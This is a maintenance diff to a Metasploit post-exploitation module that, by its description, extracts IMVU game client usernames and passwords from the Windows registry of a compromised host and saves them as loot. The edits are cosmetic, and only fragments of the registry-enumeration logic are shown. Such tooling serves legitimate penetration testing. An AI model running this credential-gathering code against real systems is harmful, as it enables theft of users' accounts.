@@ -1,12 +1,12 @@
 ##
-# $Id: enum_imvu.rb 14100 2011-10-28 18:00:10Z thelightcosine $
+# $Id: enum_imvu.rb 14100 2011-10-28 18:00:10Z theLightCosine $
 ##
 
 ##
 # This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
-# Framework web site for more information on licensing and terms of use.
-# http://metasploit.com/framework/
+# web site for more information on licensing and terms of use.
+#   http://metasploit.com/
 ##
 
 
@@ -14,6 +14,7 @@
 require 'msf/core'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/user_profiles'
+require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
 
@@ -24,7 +25,7 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'Post Windows Gather Credentials IMVU Game Client',
+			'Name'           => 'Windows Gather Credentials IMVU Game Client',
 			'Description'    => %q{
 				This module extracts account username & password from the IMVU game client
 				and stores it as loot.
@@ -34,8 +35,7 @@ class Metasploit3 < Msf::Post
 				'Shubham Dawra <shubham2dawra[at]gmail.com>' # www.SecurityXploded.com
 				],
 			'License'        => MSF_LICENSE,
-			'Version'        => '$Revision: 14100 $',
-			'Platform' => [ 'windows' ],
+			'Platform' => [ 'win' ],
 			'SessionTypes' => [ 'meterpreter' ]
 		))
 	end
@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Post
 		userhives.each do |hive|
 			next if hive['HKU'] == nil
 
-			print_status("Looking at Key #{hive['HKU']}") if datastore['VERBOSE']
+			vprint_status("Looking at Key #{hive['HKU']}")
 			subkeys = registry_enumkeys("#{hive['HKU']}\\Software\\IMVU\\")
 			if subkeys.nil? or subkeys.empty?
 				print_status ("IMVU not installed for this user.")
@@ -92,4 +92,3 @@ class Metasploit3 < Msf::Post
 	end
 
 end
-
